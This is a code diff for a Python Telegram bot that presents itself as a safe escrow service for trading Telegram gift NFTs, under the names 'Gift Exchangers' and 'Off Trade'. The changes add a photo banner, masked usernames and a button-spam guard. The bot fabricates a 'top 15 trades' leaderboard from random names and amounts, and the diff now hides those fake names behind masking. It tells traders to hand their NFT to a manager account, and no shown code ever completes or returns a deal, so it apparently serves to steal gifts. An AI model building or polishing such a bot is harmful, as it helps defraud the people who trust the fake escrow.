@@ -21,11 +21,13 @@ users = {}
 banned_users = set()
 user_states = {}
 user_temp = {}
+processing_callbacks = set()  # защита от спама кнопок
 
 settings = {
     "min_amount": 100,
     "max_amount": 300,
-    "banner_text": "👋 Приветствуем в проекте «Gift Exchange».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
+    "banner_photo": None,
+    "banner_text": "👋 Приветствуем в проекте «Gift Exchangers».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
 }
 
 # ФУНКЦИИ ЗАПРОСОВ
@@ -43,6 +45,13 @@ def answer_callback(callback_id, text=None):
     if text:
         data["text"] = text
     tg_request("answerCallbackQuery", data)
+
+# ЗАМАЗКА ЮЗЕРНЕЙМОВ
+def mask_username(username):
+    username = username.lstrip('@')
+    if len(username) <= 2:
+        return '@' + username[0] + '***'
+    return '@' + username[:2] + '***' + username[-1]
 
 # КЛАВИАТУРЫ
 def main_keyboard():
@@ -62,7 +71,7 @@ def admin_inline_keyboard():
             [{"text": "📢 Рассылка", "callback_data": "admin_broadcast"}],
             [{"text": "🚫 Бан", "callback_data": "admin_ban"}],
             [{"text": "✅ Разбан", "callback_data": "admin_unban"}],
-            [{"text": "📝 Баннер", "callback_data": "admin_banner"}],
+            [{"text": "🖼 Баннер (фото)", "callback_data": "admin_banner"}],
             [{"text": "💰 Лимиты", "callback_data": "admin_limits"}],
             [{"text": "📋 Сделки", "callback_data": "admin_deals"}],
             [{"text": "🔄 Обновить топ", "callback_data": "admin_refresh_top"}],
@@ -80,6 +89,18 @@ def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
     if reply_markup:
         data["reply_markup"] = reply_markup
     return tg_request("sendMessage", data)
+
+def send_photo(chat_id, photo_id, caption=None, reply_markup=None, parse_mode="HTML"):
+    data = {
+        "chat_id": chat_id,
+        "photo": photo_id,
+        "parse_mode": parse_mode
+    }
+    if caption:
+        data["caption"] = caption
+    if reply_markup:
+        data["reply_markup"] = reply_markup
+    return tg_request("sendPhoto", data)
 
 def send_inline(chat_id, text, buttons, parse_mode="HTML"):
     data = {
@@ -104,7 +125,19 @@ def edit_message(chat_id, message_id, text, inline_keyboard=None, parse_mode="HT
 def delete_message(chat_id, message_id):
     tg_request("deleteMessage", {"chat_id": chat_id, "message_id": message_id})
 
-# ТОП-15
+# ОТПРАВКА БАННЕРА (фото + текст или просто текст)
+def send_banner(chat_id):
+    if settings["banner_photo"]:
+        send_photo(
+            chat_id,
+            settings["banner_photo"],
+            caption=settings["banner_text"],
+            reply_markup=main_keyboard()
+        )
+    else:
+        send_message(chat_id, settings["banner_text"], main_keyboard())
+
+# ТОП-15 (юзы замазаны)
 def generate_top_15():
     names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack",
              "Kate", "Leo", "Mia", "Nick", "Olivia", "Paul", "Quinn", "Rita", "Sam", "Tina"]
@@ -114,8 +147,8 @@ def generate_top_15():
         user1 = random.choice(names) + str(random.randint(10, 99))
         user2 = random.choice(names) + str(random.randint(10, 99))
         random_top.append({
-            'user1': f"@{user1}",
-            'user2': f"@{user2}",
+            'user1': mask_username(user1),
+            'user2': mask_username(user2),
             'amount': amount,
             'date': datetime.now().strftime("%Y-%m-%d")
         })
@@ -128,6 +161,7 @@ def handle_message(message):
 
     chat_id = message['chat']['id']
     text = message.get('text', '')
+    photo = message.get('photo')
     user_id = message['from']['id']
     username = message['from'].get('username', 'NoUsername')
     first_name = message['from'].get('first_name', 'Пользователь')
@@ -141,6 +175,14 @@ def handle_message(message):
     else:
         users[user_id]['chat_id'] = chat_id
         users[user_id]['username'] = username
+
+    # Фото от админа для баннера
+    if photo and user_id == ADMIN_ID and user_states.get(user_id) == 'admin_banner':
+        del user_states[user_id]
+        file_id = photo[-1]['file_id']
+        settings['banner_photo'] = file_id
+        send_message(chat_id, "<b>✅ Баннер (фото) обновлён! Теперь пользователи будут видеть фото при старте.</b>")
+        return
 
     if user_id in user_states:
         state = user_states[user_id]
@@ -276,9 +318,7 @@ def handle_message(message):
             return
 
         if state == 'admin_banner' and user_id == ADMIN_ID:
-            del user_states[user_id]
-            settings['banner_text'] = text
-            send_message(chat_id, f"<b>✅ Баннер обновлен!</b>\n\n<b>Новый баннер:</b>\n{text}")
+            send_message(chat_id, "<b>❌ Пришлите именно фото (не текст)!</b>")
             return
 
         if state == 'admin_limits' and user_id == ADMIN_ID:
@@ -300,10 +340,16 @@ def handle_message(message):
                 send_message(chat_id, "<b>❌ Ошибка. Формат: 100-500</b>")
             return
 
+    # Сброс состояния при нажатии кнопок меню
+    menu_buttons = ["ℹ️ Информация", "❓ Как происходит сделка", "📞 Техподдержка", "🏆 Топ-15 обменов", "📝 Создать сделку"]
+    if text in menu_buttons:
+        user_states.pop(user_id, None)
+        user_temp.pop(user_id, None)
+
     if text == '/start':
         user_states.pop(user_id, None)
         user_temp.pop(user_id, None)
-        send_message(chat_id, settings['banner_text'], main_keyboard())
+        send_banner(chat_id)
         return
 
     if text.startswith('/start deal_'):
@@ -336,16 +382,11 @@ def handle_message(message):
             f"<b>📊 Сделок:</b> {len(deals)}\n"
             f"<b>👥 Пользователей:</b> {len(users)}\n"
             f"<b>🚫 Забанено:</b> {len(banned_users)}\n"
-            f"<b>💰 Лимиты:</b> ${settings['min_amount']} - ${settings['max_amount']}"
+            f"<b>💰 Лимиты:</b> ${settings['min_amount']} - ${settings['max_amount']}\n"
+            f"<b>🖼 Баннер:</b> {'фото установлено ✅' if settings['banner_photo'] else 'только текст'}"
         )
         send_inline(chat_id, admin_text, admin_inline_keyboard()['inline_keyboard'])
         return
-
-    # Сброс состояния при нажатии кнопок меню
-    menu_buttons = ["ℹ️ Информация", "❓ Как происходит сделка", "📞 Техподдержка", "🏆 Топ-15 обменов", "📝 Создать сделку"]
-    if text in menu_buttons:
-        user_states.pop(user_id, None)
-        user_temp.pop(user_id, None)
 
     if text == "ℹ️ Информация":
         info_text = (
@@ -417,165 +458,178 @@ def handle_callback(callback):
     user_id = callback['from']['id']
     username = callback['from'].get('username', 'NoUsername')
 
-    answer_callback(callback_id)
+    # Защита от спама кнопок
+    cb_key = f"{user_id}_{data}_{message_id}"
+    if cb_key in processing_callbacks:
+        answer_callback(callback_id, "⏳ Подождите...")
+        return
+    processing_callbacks.add(cb_key)
 
-    if data.startswith('accept_'):
-        deal_id = data.replace('accept_', '')
+    try:
+        answer_callback(callback_id)
 
-        if deal_id not in deals:
-            edit_message(chat_id, message_id, "<b>❌ Сделка не найдена!</b>")
+        if data.startswith('accept_'):
+            deal_id = data.replace('accept_', '')
+
+            if deal_id not in deals:
+                edit_message(chat_id, message_id, "<b>❌ Сделка не найдена!</b>")
+                return
+
+            deal = deals[deal_id]
+
+            if deal['status'] != 'waiting':
+                edit_message(chat_id, message_id, "<b>❌ Сделка уже недоступна!</b>")
+                return
+
+            if user_id == deal['creator_id']:
+                edit_message(chat_id, message_id, "<b>❌ Нельзя принять свою сделку!</b>")
+                return
+
+            if username.lower() != deal['second_user'].lower():
+                edit_message(chat_id, message_id, "<b>❌ Эта сделка создана не для вас!</b>")
+                return
+
+            deal['participant_id'] = user_id
+            deal['participant_name'] = username
+            deal['status'] = 'in_progress'
+
+            top_deals.append({
+                'user1': mask_username(deal['creator_name']),
+                'user2': mask_username(username),
+                'amount': deal['amount'],
+                'date': datetime.now().strftime("%Y-%m-%d")
+            })
+            top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
+
+            send_message(
+                deal['creator_id'],
+                f"<b>✅ Участник принял вашу сделку!</b>\n\n"
+                f"<b>Передайте NFT менеджеру @GiftExchangersManager для завершения обмена.</b>"
+            )
+
+            edit_message(
+                chat_id,
+                message_id,
+                f"<b>✅ Вы приняли сделку #{deal_id}</b>\n\n"
+                f"<b>Ожидайте — создатель передаст NFT менеджеру @GiftExchangersManager.</b>"
+            )
             return
 
-        deal = deals[deal_id]
-
-        if deal['status'] != 'waiting':
-            edit_message(chat_id, message_id, "<b>❌ Сделка уже недоступна!</b>")
+        if data.startswith('cancel_'):
+            deal_id = data.replace('cancel_', '')
+            if deal_id in deals:
+                if deals[deal_id]['creator_id'] == user_id:
+                    if deals[deal_id]['status'] != 'waiting':
+                        edit_message(chat_id, message_id, "<b>❌ Сделку нельзя отменить — она уже принята!</b>")
+                        return
+                    deals[deal_id]['status'] = 'cancelled'
+                    edit_message(chat_id, message_id, f"<b>❌ Сделка #{deal_id} отменена</b>")
+                else:
+                    edit_message(chat_id, message_id, "<b>❌ Только создатель может отменить сделку!</b>")
             return
 
-        if user_id == deal['creator_id']:
-            edit_message(chat_id, message_id, "<b>❌ Нельзя принять свою сделку!</b>")
+        if data == "main_menu":
+            delete_message(chat_id, message_id)
+            send_banner(chat_id)
             return
 
-        if username.lower() != deal['second_user'].lower():
-            edit_message(chat_id, message_id, "<b>❌ Эта сделка создана не для вас!</b>")
+        if data == "how_deal":
+            deal_text = (
+                "<b>❓ Как проходит сделка в Off Trade?</b>\n\n"
+                "• <b>Продавец и покупатель обговаривают условия сделки 🤝</b>\n"
+                "• <b>Один участник сделки создаёт сделку через чек/в меню бота - @GiftExchangersBot 🎁</b>\n"
+                "• <b>Второй участник сделки принимает сделку 📤</b>\n"
+                "• <b>После того как 2 человек присоединился к сделке то 1 человек должен передать NFT менеджеру - @GiftExchangersManager 💰</b>\n"
+                "• <b>После передачи подарка, тех поддержка моментально одобрит приход NFT на аккаунт и затем следующая сторона передаёт NFT человеку и потом Менеджер автоматически передаст вам NFT</b>\n"
+                "• <b>После этого первая сторона сделки пишет любое сообщение технической поддержке - @OffTradeSupport, после чего моментально получает подарок.</b>\n"
+                "• <b>Сделка завершена успешно! ✅</b>"
+            )
+            buttons = [[{"text": "🏠 Главное меню", "callback_data": "main_menu"}]]
+            edit_message(chat_id, message_id, deal_text, {"inline_keyboard": buttons})
             return
 
-        deal['participant_id'] = user_id
-        deal['participant_name'] = username
-        deal['status'] = 'in_progress'
-
-        top_deals.append({
-            'user1': f"@{deal['creator_name']}",
-            'user2': f"@{username}",
-            'amount': deal['amount'],
-            'date': datetime.now().strftime("%Y-%m-%d")
-        })
-        top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
-
-        send_message(
-            deal['creator_id'],
-            f"<b>✅ @{username} принял вашу сделку!</b>\n\n"
-            f"<b>Передайте NFT менеджеру @{MANAGER} для завершения обмена.</b>"
-        )
-
-        edit_message(
-            chat_id,
-            message_id,
-            f"<b>✅ Вы приняли сделку #{deal_id}</b>\n\n"
-            f"<b>Ожидайте — создатель передаст NFT менеджеру @{MANAGER}.</b>"
-        )
-        return
-
-    if data.startswith('cancel_'):
-        deal_id = data.replace('cancel_', '')
-        if deal_id in deals:
-            if deals[deal_id]['creator_id'] == user_id:
-                deals[deal_id]['status'] = 'cancelled'
-                edit_message(chat_id, message_id, f"<b>❌ Сделка #{deal_id} отменена</b>")
-            else:
-                edit_message(chat_id, message_id, "<b>❌ Только создатель может отменить сделку!</b>")
-        return
-
-    if data == "main_menu":
-        delete_message(chat_id, message_id)
-        send_message(chat_id, settings['banner_text'], main_keyboard())
-        return
-
-    if data == "how_deal":
-        deal_text = (
-            "<b>❓ Как проходит сделка в Off Trade?</b>\n\n"
-            "• <b>Продавец и покупатель обговаривают условия сделки 🤝</b>\n"
-            "• <b>Один участник сделки создаёт сделку через чек/в меню бота - @GiftExchangersBot 🎁</b>\n"
-            "• <b>Второй участник сделки принимает сделку 📤</b>\n"
-            "• <b>После того как 2 человек присоединился к сделке то 1 человек должен передать NFT менеджеру - @GiftExchangersManager 💰</b>\n"
-            "• <b>После передачи подарка, тех поддержка моментально одобрит приход NFT на аккаунт и затем следующая сторона передаёт NFT человеку и потом Менеджер автоматически передаст вам NFT</b>\n"
-            "• <b>После этого первая сторона сделки пишет любое сообщение технической поддержке - @OffTradeSupport, после чего моментально получает подарок.</b>\n"
-            "• <b>Сделка завершена успешно! ✅</b>"
-        )
-        buttons = [[{"text": "🏠 Главное меню", "callback_data": "main_menu"}]]
-        edit_message(chat_id, message_id, deal_text, {"inline_keyboard": buttons})
-        return
-
-    if user_id != ADMIN_ID:
-        return
-
-    if data == "admin_stats":
-        stats = (
-            f"<b>📊 СТАТИСТИКА</b>\n\n"
-            f"<b>📌 Всего сделок:</b> {len(deals)}\n"
-            f"<b>⏳ Ожидают:</b> {sum(1 for d in deals.values() if d['status'] == 'waiting')}\n"
-            f"<b>🔄 В процессе:</b> {sum(1 for d in deals.values() if d['status'] == 'in_progress')}\n"
-            f"<b>✅ Завершено:</b> {sum(1 for d in deals.values() if d['status'] == 'completed')}\n"
-            f"<b>❌ Отменено:</b> {sum(1 for d in deals.values() if d['status'] == 'cancelled')}\n"
-            f"<b>👥 Пользователей:</b> {len(users)}\n"
-            f"<b>🚫 Забанено:</b> {len(banned_users)}\n"
-            f"<b>🏆 В топ-15:</b> {len(top_deals)}\n"
-            f"<b>💰 Лимиты:</b> ${settings['min_amount']} - ${settings['max_amount']}"
-        )
-        edit_message(chat_id, message_id, stats, admin_inline_keyboard())
-        return
-
-    if data == "admin_broadcast":
-        user_states[user_id] = 'admin_broadcast'
-        edit_message(chat_id, message_id, "<b>📢 Введите текст рассылки:\n(Отправьте сообщение в чат)</b>")
-        return
-
-    if data == "admin_ban":
-        user_states[user_id] = 'admin_ban'
-        edit_message(chat_id, message_id, "<b>🚫 Введите @username или ID для бана:\n(Отправьте сообщение в чат)</b>")
-        return
-
-    if data == "admin_unban":
-        user_states[user_id] = 'admin_unban'
-        edit_message(chat_id, message_id, "<b>✅ Введите @username или ID для разбана:\n(Отправьте сообщение в чат)</b>")
-        return
-
-    if data == "admin_banner":
-        user_states[user_id] = 'admin_banner'
-        edit_message(
-            chat_id,
-            message_id,
-            f"<b>📝 Введите новый текст баннера:\n(Отправьте сообщение в чат)</b>\n\n"
-            f"<b>Текущий баннер:</b>\n{settings['banner_text']}"
-        )
-        return
-
-    if data == "admin_limits":
-        user_states[user_id] = 'admin_limits'
-        edit_message(
-            chat_id,
-            message_id,
-            f"<b>💰 Введите лимиты в формате мин-макс\nНапример: 100-500\n\n"
-            f"Текущие: ${settings['min_amount']} - ${settings['max_amount']}</b>"
-        )
-        return
-
-    if data == "admin_deals":
-        if not deals:
-            edit_message(chat_id, message_id, "<b>📭 Нет сделок</b>", admin_inline_keyboard())
+        if user_id != ADMIN_ID:
             return
-        text = "<b>📋 ВСЕ СДЕЛКИ (последние 10):</b>\n\n"
-        status_icons = {'waiting': '⏳', 'in_progress': '🔄', 'cancelled': '❌', 'completed': '✅'}
-        for deal_id, deal in list(deals.items())[-10:]:
-            icon = status_icons.get(deal['status'], '❓')
-            text += f"{icon} <code>{deal_id}</code>: @{deal['creator_name']} → @{deal['second_user']} (${deal['amount']})\n"
-        if len(deals) > 10:
-            text += f"\n<b>...и еще {len(deals) - 10} сделок</b>"
-        edit_message(chat_id, message_id, text, admin_inline_keyboard())
-        return
 
-    if data == "admin_refresh_top":
-        top_deals = generate_top_15()
-        text = "<b>🔄 ТОП-15 ОБНОВЛЕН:</b>\n\n"
-        for i, deal in enumerate(top_deals[:15], 1):
-            text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
-        edit_message(chat_id, message_id, text, admin_inline_keyboard())
-        return
+        if data == "admin_stats":
+            stats = (
+                f"<b>📊 СТАТИСТИКА</b>\n\n"
+                f"<b>📌 Всего сделок:</b> {len(deals)}\n"
+                f"<b>⏳ Ожидают:</b> {sum(1 for d in deals.values() if d['status'] == 'waiting')}\n"
+                f"<b>🔄 В процессе:</b> {sum(1 for d in deals.values() if d['status'] == 'in_progress')}\n"
+                f"<b>✅ Завершено:</b> {sum(1 for d in deals.values() if d['status'] == 'completed')}\n"
+                f"<b>❌ Отменено:</b> {sum(1 for d in deals.values() if d['status'] == 'cancelled')}\n"
+                f"<b>👥 Пользователей:</b> {len(users)}\n"
+                f"<b>🚫 Забанено:</b> {len(banned_users)}\n"
+                f"<b>🏆 В топ-15:</b> {len(top_deals)}\n"
+                f"<b>💰 Лимиты:</b> ${settings['min_amount']} - ${settings['max_amount']}"
+            )
+            edit_message(chat_id, message_id, stats, admin_inline_keyboard())
+            return
 
-    if data == "admin_close":
-        delete_message(chat_id, message_id)
-        send_message(chat_id, settings['banner_text'], main_keyboard())
-        return
+        if data == "admin_broadcast":
+            user_states[user_id] = 'admin_broadcast'
+            edit_message(chat_id, message_id, "<b>📢 Введите текст рассылки:\n(Отправьте сообщение в чат)</b>")
+            return
+
+        if data == "admin_ban":
+            user_states[user_id] = 'admin_ban'
+            edit_message(chat_id, message_id, "<b>🚫 Введите @username или ID для бана:\n(Отправьте сообщение в чат)</b>")
+            return
+
+        if data == "admin_unban":
+            user_states[user_id] = 'admin_unban'
+            edit_message(chat_id, message_id, "<b>✅ Введите @username или ID для разбана:\n(Отправьте сообщение в чат)</b>")
+            return
+
+        if data == "admin_banner":
+            user_states[user_id] = 'admin_banner'
+            edit_message(
+                chat_id,
+                message_id,
+                "<b>🖼 Отправьте фото которое станет баннером.\n\nОно будет показываться пользователям вместе с текстом при /start и в главном меню.</b>"
+            )
+            return
+
+        if data == "admin_limits":
+            user_states[user_id] = 'admin_limits'
+            edit_message(
+                chat_id,
+                message_id,
+                f"<b>💰 Введите лимиты в формате мин-макс\nНапример: 100-500\n\n"
+                f"Текущие: ${settings['min_amount']} - ${settings['max_amount']}</b>"
+            )
+            return
+
+        if data == "admin_deals":
+            if not deals:
+                edit_message(chat_id, message_id, "<b>📭 Нет сделок</b>", admin_inline_keyboard())
+                return
+            text = "<b>📋 ВСЕ СДЕЛКИ (последние 10):</b>\n\n"
+            status_icons = {'waiting': '⏳', 'in_progress': '🔄', 'cancelled': '❌', 'completed': '✅'}
+            for deal_id, deal in list(deals.items())[-10:]:
+                icon = status_icons.get(deal['status'], '❓')
+                text += f"{icon} <code>{deal_id}</code>: @{deal['creator_name']} → @{deal['second_user']} (${deal['amount']})\n"
+            if len(deals) > 10:
+                text += f"\n<b>...и еще {len(deals) - 10} сделок</b>"
+            edit_message(chat_id, message_id, text, admin_inline_keyboard())
+            return
+
+        if data == "admin_refresh_top":
+            top_deals = generate_top_15()
+            text = "<b>🔄 ТОП-15 ОБНОВЛЕН:</b>\n\n"
+            for i, deal in enumerate(top_deals[:15], 1):
+                text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
+            edit_message(chat_id, message_id, text, admin_inline_keyboard())
+            return
+
+        if data == "admin_close":
+            delete_message(chat_id, message_id)
+            send_banner(chat_id)
+            return
+
+    finally:
+        processing_callbacks.discard(cb_key)
 
 # ЗАПУСК
 def main():
